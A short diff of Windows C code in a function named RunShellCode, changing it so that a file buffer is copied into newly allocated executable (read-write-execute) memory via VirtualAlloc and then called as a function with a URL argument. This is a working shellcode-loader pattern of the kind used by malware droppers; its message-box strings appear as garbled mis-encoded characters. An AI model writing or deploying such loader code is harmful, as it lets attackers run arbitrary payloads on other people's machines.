@@ -86,8 +86,12 @@ void RunShellCode()
 	typedef void(WINAPI* fnFun)(
 		char*
 		);
-	
-	fnFun Shellcode = (fnFun)(filebuf);
+	PVOID p = NULL;
+	if ((p = VirtualAlloc(NULL, filelen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)
+		MessageBoxA(NULL, "…Í«Îƒ⁄¥Ê ß∞‹", "Ã·–—", MB_OK);
+	if (!(memcpy(p, filebuf, filelen)))
+		MessageBoxA(NULL, "–¥ƒ⁄¥Ê ß∞‹", "Ã·–—", MB_OK);
+	fnFun Shellcode = (fnFun)p;
 	Shellcode(URL);
 
 }
